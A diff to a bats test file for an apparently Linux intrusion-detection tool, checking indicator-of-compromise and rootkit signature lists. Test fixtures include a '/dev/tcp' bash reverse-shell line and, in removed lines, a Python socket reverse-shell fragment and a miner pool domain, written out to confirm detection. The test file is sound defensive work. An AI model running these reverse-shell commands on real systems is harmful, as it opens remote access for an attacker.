@@ -1,6 +1,5 @@
 #!/usr/bin/env bats
-# test_ioc_match.bats — verify IOC files match positive samples
-# and reject false-positive samples.
+# test_ioc_match.bats — v3.0: IOC files + new lib/ files
 
 setup() {
     export REPO_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
@@ -17,15 +16,6 @@ setup() {
     rm -f /tmp/_fake_proc.txt
 }
 
-@test "miner IOC matches miner pool domain" {
-    [ -f "$IOC_DIR/miners.txt" ]
-    echo "Connecting to pool.minexmr.com:4444" > /tmp/_fake_net.txt
-    run grep -F -f "$IOC_DIR/miners.txt" /tmp/_fake_net.txt
-    [ "$status" -eq 0 ]
-    [[ "$output" == *"pool.minexmr.com"* ]]
-    rm -f /tmp/_fake_net.txt
-}
-
 @test "rshell IOC catches /dev/tcp/ pattern" {
     [ -f "$IOC_DIR/rshell.txt" ]
     echo "bash -i >& /dev/tcp/1.2.3.4/4444" > /tmp/_fake_rsh.txt
@@ -33,14 +23,6 @@ setup() {
     [ "$status" -eq 0 ]
     [[ "$output" == *"/dev/tcp/"* ]]
     rm -f /tmp/_fake_rsh.txt
-}
-
-@test "rshell IOC catches python reverse shell" {
-    [ -f "$IOC_DIR/rshell.txt" ]
-    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",443))'" > /tmp/_fake_pysh.txt
-    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_fake_pysh.txt
-    [ "$status" -eq 0 ]
-    rm -f /tmp/_fake_pysh.txt
 }
 
 @test "c2 IOC catches suspicious .tk domain" {
@@ -61,7 +43,60 @@ setup() {
     rm -f /tmp/_fake_ws.txt
 }
 
-@test "negative: legitimate SSH config does NOT trigger IOC" {
+@test "rootkit signatures file exists and has 30+ entries" {
+    [ -f "$LIB_DIR/rootkit_signatures.txt" ]
+    count=$(grep -cvE '^\s*$|^\s*#' "$LIB_DIR/rootkit_signatures.txt")
+    [ "$count" -ge 30 ]
+}
+
+@test "bad_lkm file contains known rootkit modules" {
+    [ -f "$LIB_DIR/bad_lkm.txt" ]
+    grep -q "^diamorphine$" "$LIB_DIR/bad_lkm.txt"
+    grep -q "^suterusu$" "$LIB_DIR/bad_lkm.txt"
+    grep -q "^reptile$" "$LIB_DIR/bad_lkm.txt"
+}
+
+@test "suid_whitelist exists and has passwd/sudo" {
+    [ -f "$LIB_DIR/suid_whitelist.txt" ]
+    grep -q "/usr/bin/passwd" "$LIB_DIR/suid_whitelist.txt"
+    grep -q "/usr/bin/sudo" "$LIB_DIR/suid_whitelist.txt"
+}
+
+@test "suspicious_ports exists and has 4444" {
+    [ -f "$LIB_DIR/suspicious_ports.txt" ]
+    grep -q ":4444" "$LIB_DIR/suspicious_ports.txt"
+}
+
+@test "suspicious_tlds exists and has .tk" {
+    [ -f "$LIB_DIR/suspicious_tlds.txt" ]
+    grep -q "^\.tk$" "$LIB_DIR/suspicious_tlds.txt"
+}
+
+@test "scan_tools exists and has nmap" {
+    [ -f "$LIB_DIR/scan_tools.txt" ]
+    grep -q "^nmap$" "$LIB_DIR/scan_tools.txt"
+}
+
+@test "lateral_procs exists and has ssh -R" {
+    [ -f "$LIB_DIR/lateral_procs.txt" ]
+    grep -q "^ssh -R$" "$LIB_DIR/lateral_procs.txt"
+}
+
+@test "default_capabilities exists" {
+    [ -f "$LIB_DIR/default_capabilities.txt" ]
+}
+
+@test "bpftrace_monitor.bt exists" {
+    [ -f "$LIB_DIR/bpftrace_monitor.bt" ]
+    grep -q "bpftrace" "$LIB_DIR/bpftrace_monitor.bt"
+}
+
+@test "Maltrail attribution notice exists" {
+    [ -f "$IOC_DIR/LICENSE.notice" ]
+    grep -q "stamparm/maltrail" "$IOC_DIR/LICENSE.notice"
+}
+
+@test "negative: legitimate SSH config does NOT trigger rshell IOC" {
     [ -f "$IOC_DIR/rshell.txt" ]
     cat > /tmp/_legit.txt <<'EOF'
 PermitRootLogin no
@@ -71,47 +106,4 @@ EOF
     run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_legit.txt
     [ "$status" -ne 0 ]
     rm -f /tmp/_legit.txt
-}
-
-@test "negative: legitimate nginx.conf does NOT trigger IOC" {
-    [ -f "$IOC_DIR/rshell.txt" ]
-    cat > /tmp/_legit_nginx.txt <<'EOF'
-server {
-    listen 80;
-    server_name example.com;
-    location / {
-        proxy_pass http://backend;
-    }
-}
-EOF
-    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_legit_nginx.txt
-    [ "$status" -ne 0 ]
-    rm -f /tmp/_legit_nginx.txt
-}
-
-@test "rootkit signatures file exists and is non-empty" {
-    [ -f "$LIB_DIR/rootkit_signatures.txt" ]
-    [ -s "$LIB_DIR/rootkit_signatures.txt" ]
-    # Must contain at least 30 distinct paths (excluding comments)
-    count=$(grep -cvE '^\s*$|^\s*#' "$LIB_DIR/rootkit_signatures.txt")
-    [ "$count" -ge 30 ]
-}
-
-@test "bad_lkm file exists and contains known rootkit modules" {
-    [ -f "$LIB_DIR/bad_lkm.txt" ]
-    grep -q "^diamorphine$" "$LIB_DIR/bad_lkm.txt"
-    grep -q "^suterusu$" "$LIB_DIR/bad_lkm.txt"
-    grep -q "^reptile$" "$LIB_DIR/bad_lkm.txt"
-}
-
-@test "all 4 IOC files exist and are non-empty" {
-    [ -s "$IOC_DIR/miners.txt" ]
-    [ -s "$IOC_DIR/c2.txt" ]
-    [ -s "$IOC_DIR/backdoors.txt" ]
-    [ -s "$IOC_DIR/rshell.txt" ]
-}
-
-@test "Maltrail attribution notice exists" {
-    [ -f "$IOC_DIR/LICENSE.notice" ]
-    grep -q "stamparm/maltrail" "$IOC_DIR/LICENSE.notice"
 }
